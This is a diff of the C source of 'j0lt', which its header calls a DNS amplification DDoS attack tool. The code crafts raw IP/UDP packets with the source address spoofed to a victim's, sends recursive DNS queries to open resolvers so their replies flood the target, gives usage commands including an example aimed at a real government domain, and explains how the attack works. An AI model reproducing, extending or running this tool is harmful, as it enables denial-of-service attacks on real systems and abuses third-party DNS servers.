@@ -1,20 +1,37 @@
-/* j0lt.c
- *
- * For using:
- * ./j0lt <RESOLVER IP> <SPOOF_IP> <RESOLVER PORT> <SPOOF PORT> <PAGE>
- *
- * For reading:
- * https://datatracker.ietf.org/doc/html/rfc1700 (NUMBERS)
- * https://datatracker.ietf.org/doc/html/rfc1035 (DNS)
- * https://datatracker.ietf.org/doc/html/rfc1071 (CHECKSUM)
- * https://www.rfc-editor.org/rfc/rfc768.html (UDP)
- * https://www.rfc-editor.org/rfc/rfc760 (IP)
- * https://public-dns.info/nameserver/ca.txt (List of open name servers)
- * For testing:
- * use ctrl + ` to bring up a terminal then $ unshare -rn. This will give you suid to test this
- * sudo tcpdump -X -n udp port 53
- *
+/* PRIVATE CONFIDENTIAL SOURCE MATERIALS DO NOT DISTRIBUTE.
+ *      _________  .__   __
+ *     |__\   _  \ |  |_/  |_
+ *     |  /  /_\  \|  |\   __\
+ *     |  \  \_/   \  |_|  |                               2021
+ * /\__|  |\_____  /____/__|                      the-scientist
+ * \______|      \/              ddos amplification attack tool
+ * ------------------------------------------------------------
+ * > This is unpublished proprietary source code of:
  * the-scientist
+ * tofu@rootstorm.com
+ * ------------------------------------------------------------
+ * > Knowledge:
+ * https://datatracker.ietf.org/doc/html/rfc1700    (NUMBERS)
+ * https://datatracker.ietf.org/doc/html/rfc1035    (DNS)
+ * https://datatracker.ietf.org/doc/html/rfc1071    (CHECKSUM)
+ * https://www.rfc-editor.org/rfc/rfc768.html       (UDP)
+ * https://www.rfc-editor.org/rfc/rfc760            (IP)
+ * ------------------------------------------------------------
+ * > Usage: sudo ./j0lt <target> <port> <num-packets>
+ * (the-scientist㉿rs)-[~/0day]$ gcc j0lt.c -o j0lt
+ * (the-scientist㉿rs)-[~/0day]$ unshare -rn
+ * (the-scientist㉿rs)-[~/0day]# ./j0lt mod.gov.cn 80 1337
+ * ------------------------------------------------------------
+ * > What is DNS a amplification attack:
+ * A type of DDoS attack in which attackers use publicly
+ * accessible open DNS servers to flood a target with DNS
+ * response traffic. An attacker sends a DNS lookup request
+ * to an open DNS server with the source address spoofed to
+ * be the target’s address. When the DNS server sends the S 
+ * record response, it is sent to the target instead.
+ * ------------------------------------------------------------
+ * > Big hi to the only sane place left on the internet:
+ * irc.efnet.org #c
  */
 
 #include <stdbool.h>
@@ -76,12 +93,12 @@ const char* g_ansi = {
     "░░░░░░░░░░░░░        ░░░░░░░░░░░░░-d <dst>        : target server(spoof)   \n"
     "░░░░░░░░░░░▓       ▒░░░░░░░░░░░░░ -p <port>       : target port            \n"
     "░░░░░░░░░░▒      ░░░░░░░░░░░░░░░░ -n <num>        : num UDP packets to send\n"
-    "░░░░░░░░░       ░░░░░░░░░░░░░░░░░ -r <dns rcrd>   : list of dns records    \n"
-    "░░░░░░░░░     ░░░░░░░░░░░░░░░░░░░ -s <dns srv>    : list of dns servers    \n"
-    "░░░░░░░     ▒░░░░░░░░░░░░░░░░░░░░ -P <dns port>   : dns port (53)          \n"
-    "░░░░░      ░░░░░░░░░░░░░░░░░░░░░░                                          \n"
-    "░░░░░    ░░░░░░░░░░░░░░░░░░░░░░░░  w3lc0m3 t0 j0lt                         \n"
-    "░░░░   ▒░░░░░░░░░░░░░░░░░░░░░░░░░  a DNS amplification attack tool         \n"
+    "░░░░░░░░░       ░░░░░░░░░░░░░░░░░                                          \n"
+    "░░░░░░░░░     ░░░░░░░░░░░░░░░░░░░                                          \n"
+    "░░░░░░░     ▒░░░░░░░░░░░░░░░░░░░░                                          \n"
+    "░░░░░      ░░░░░░░░░░░░░░░░░░░░░░  w3lc0m3 t0 j0lt                         \n"
+    "░░░░░    ░░░░░░░░░░░░░░░░░░░░░░░░  a DNS amplification attack tool         \n"
+    "░░░░   ▒░░░░░░░░░░░░░░░░░░░░░░░░░                                          \n"
     "░░░    ░░░░░░░░░░░░░░░░░░░░░░░░░░                                          \n"
     "░░  ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                        the-scientist     \n"
     "░ ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                        tofu@rootstorm.com\n"
@@ -156,11 +173,12 @@ DEFINE_INSERT_FN(qword, uint64_t)
 #define     IP_IHL_MIN_J0LT 5
 #define     IP_IHL_MAX_J0LT 15
 #define     IP_TTL_J0LT 0x40
-#define     IP_ID_J0LT 0xc3f0
+#define     IP_ID_J0LT 0xb00b
 // FLAGS
 #define     IP_RF_J0LT 0x8000 // reserved fragment flag
 #define     IP_DF_J0LT 0x4000 // dont fragment flag
 #define     IP_MF_J0LT 0x2000 // more fragments flag
+#define     IP_OF_J0LT 0x0000 // no clue what 0000 is. 
 // END FLAGS
 #define     IP_VER_J0LT 4
 // END IPHEADER VALUES 
@@ -168,32 +186,23 @@ DEFINE_INSERT_FN(qword, uint64_t)
 // DNS HEADER VALUES 
 #define 	DNS_ID_J0LT 0x1337
 #define 	DNS_QR_J0LT 0 // query (0), response (1).
-// OPCODE VALS 
-#define 	DNS_OP_QUERY_J0LT  0 // standard query (QUERY)
-#define 	DNS_OP_IQUERY_J0LT 1 // inverse query (IQUERY)
-#define 	DNS_OP_STATUS_J0LT 2 // server status (STATUS)
-#define 	DNS_OPCODE_J0LT DNS_OP_QUERY_J0LT
+// OPCODE
+#define 	DNS_OPCODE_J0LT ns_o_query
 // END OPCODE
 #define 	DNS_AA_J0LT 0 // Authoritative Answer
 #define 	DNS_TC_J0LT 0 // TrunCation
-#define 	DNS_RD_J0LT 0 // Recursion Desired 
+#define 	DNS_RD_J0LT 1 // Recursion Desired 
 #define 	DNS_RA_J0LT 0 // Recursion Available
 #define 	DNS_Z_J0LT 0 // Reserved
 #define 	DNS_AD_J0LT 0 // dns sec
 #define 	DNS_CD_J0LT 0 // dns sec
 // RCODE
-#define 	DNS_RC_NO_ER_J0LT   0
-#define 	DNS_RC_FMT_ERR_J0LT 1
-#define 	DNS_RC_SRVR_FA_J0LT 2
-#define 	DNS_RC_NAME_ER_J0LT 3
-#define 	DNS_RC_NOT_IMP_J0LT 4
-#define 	DNS_RC_REFUSED_J0LT 5
-#define 	DNS_RCODE_J0LT DNS_RC_NO_ER_J0LT
+#define 	DNS_RCODE_J0LT ns_r_noerror
 // END RCODE
-#define 	DNS_QDCOUNT_J0LT 0x0001 // num entry question
-#define 	DNS_ANCOUNT_J0LT 0x0000 // num RR answer
-#define 	DNS_NSCOUNT_J0LT 0x0000 // num NS RR 
-#define     DNS_ARCOUNT_J0LT 0x0001 // num RR additional
+#define 	DNS_QDCOUNT_J0LT 0x0001 // num questions
+#define 	DNS_ANCOUNT_J0LT 0x0000 // num answer RRs
+#define 	DNS_NSCOUNT_J0LT 0x0000 // num authority RRs 
+#define     DNS_ARCOUNT_J0LT 0x0000 // num additional RRs
 // END HEADER VALUES
 
 typedef struct iphdr IPHEADER;
@@ -273,7 +282,12 @@ PrintHex(const uint8_t* datagram,
         size_t nwritten
 );
 
-#define DEBUG 1
+void
+InsertDNSAdditional(uint8_t** buf,
+        size_t* buflen
+);
+
+#define DEBUG 0
 int
 main(int argc, char** argv)
 {
@@ -288,10 +302,10 @@ main(int argc, char** argv)
     IPHEADER ipheader;
     PSEUDOHDR pseudoheader;
 
-    printf("%s", g_ansi);
-
-    if (argc != 6)
+    if (argc != 3) {
+        printf("%s", g_ansi);
         goto fail_state;
+    }
 
     resolvip = argv[ 1 ];
     spoofip = argv[ 2 ];
@@ -306,7 +320,8 @@ main(int argc, char** argv)
     status = true;
     PackDNSHeader(&dnsheader);
     status &= InsertDNSHeader(&curpos, &buflen, &dnsheader);
-    status &= InsertDNSQuestion(( void** ) &curpos, &buflen, url, ns_t_any, ns_c_any);
+    status &= InsertDNSQuestion(( void** ) &curpos, &buflen, url, ns_t_ns, ns_c_in);
+
     if (status == false)
         goto fail_state;
 
@@ -343,7 +358,6 @@ fail_state:
 } // END MAIN
 
 
-
 void
 PrintHex(const uint8_t* datagram,
         size_t nwritten) {
@@ -358,6 +372,7 @@ PrintHex(const uint8_t* datagram,
             printf(" ");
         printf("%.2x", datagram[ i ]);
     }
+    putc('\n', stdout);
 }
 
 
@@ -407,7 +422,7 @@ PackIPHeader(IPHEADER* iphdr,
     iphdr->ihl = IP_IHL_MIN_J0LT;
     iphdr->tot_len = (iphdr->ihl << 2) + udpsz + nwritten;
     iphdr->id = IP_ID_J0LT;
-    iphdr->frag_off = IP_DF_J0LT;
+    iphdr->frag_off = IP_OF_J0LT;
     iphdr->ttl = IP_TTL_J0LT;
     iphdr->protocol = getprotobyname("udp")->p_proto;
     iphdr->saddr = htonl(inet_addr(spoofip)); // spoofed ip address to victim
